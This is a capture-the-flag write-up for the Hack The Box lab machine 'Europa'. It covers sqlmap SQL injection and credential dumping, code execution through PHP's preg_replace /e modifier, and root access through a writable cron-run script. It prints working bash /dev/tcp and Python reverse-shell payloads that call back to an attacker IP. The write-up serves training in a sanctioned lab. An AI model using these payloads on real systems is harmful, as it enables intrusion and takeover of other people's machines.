# Europa
#### 10.10.10.22
#### Writeup by: hexp https://www.hackthebox.eu/profile/14319

**Nmap**

```{r, engine='bash', count_lines}
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (EdDSA)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Issuer: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-04-19T09:06:22
| Not valid after:  2027-04-17T09:06:22
| MD5:   35d5 1c04 7ae8 0f5c 35a0 bc49 53e5 d085
|_SHA-1: ced9 8f01 1228 e35d 83d3 2634 b4c1 ed52 b917 3335
|_ssl-date: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Opening :443 and :80 in browser doesn't give us anything relevant. However this line in the nmap scan looks interesting.

```
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
```

So lets change our hosts file accordingly and add:

```
10.10.10.22		admin-portal.europacorp.htb
```

Opening https://admin-portal.europacorp.htb now, redirects us to a login form. 
Lets see if the email or password is vulnerable to sql injection:

```
sqlmap -u https://admin-portal.europacorp.htb/login.php --data="email=abc'&password='" --dbms="MySQL" --technique=E  --dump --threads 8 --dbs

Database: admin
Table: users
[2 entries]
+----+----------------------+--------+---------------+----------------------------------+
| id | email                | active | username      | password                         |
+----+----------------------+--------+---------------+----------------------------------+
| 1  | admin@europacorp.htb | 1      | administrator | 2b6d315337f18617ba18922c0b9597ff |
| 2  | john@europacorp.htb  | 1      | john          | 2b6d315337f18617ba18922c0b9597ff |
+----+----------------------+--------+---------------+----------------------------------+
```

Awesome, we got a login name: **admin@europacorp.htb** and password hash: **2b6d315337f18617ba18922c0b9597ff**.
Decrypting the md5 hash with some online tools will translate to: **SuperSecretPassword!**
So our login is
**admin@europacorp.htb:SuperSecretPassword!**

Pretty sure we need to exploit the **OpenVPN Config Generator** located at https://admin-portal.europacorp.htb/tools.php. So after filling in a IP address a config gets generated with our IP address filled in at the locations of **ip_address**. After googling a bit we found out that the php function **preg_replace** is exploitable.

Okay intercepting the POST with BurpSuite and send it to the Repeater will leave us with a screen like this:
![index.php](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Europa/images/europa_burp.png "BurpSuite")


Because we have full access to the regex expression that is used in preg_replace();
We can pass the **e** modifier which will make the text being executed. I only want it to be executed once so I picked a pattern that only occurs once. As you can see I used **/remote_address/e** as the pattern and **phpinfo()** as the text. It executes perfectly as shown in the screenshot below.

![index.php](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Europa/images/burp_info.png "phpinfo")

So lets put our payload in the ipaddress parameter which is as follows:

```
system("/bin/bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.14/12345%200>%261'");
```
And send it while listening with netcat on port 12345
```
nc -nvlp 12345
```
![index.php](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Europa/images/shell.png "shell")

Perfect we got shell! We can find the user flag at /home/john/user.txt

```
2f8d40cc05295154a9c3452c19ddc221
```
Alright our next step is priv esc. 
There seems to be a directory called cronjobs lets see what is inside..

```
/var/www/cronjobs$ cat clearlogs
cat clearlogs
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```
So apparently this script calls another script located at /var/www/cmd/logcleared.sh, lets see if we can make it spawn another reverse shell with python3.

So I created a logcleared.sh containing this code:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",12346));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
and did
```
chmod 777 logcleared.sh
```
After waiting a minute listening with netcat on port 12346 we got another reverse shell with root privileges. 
Now simply cat the root.txt at /root/ et voilà :
```
7f19438b27578e4fcc8bef3a029af5a5
```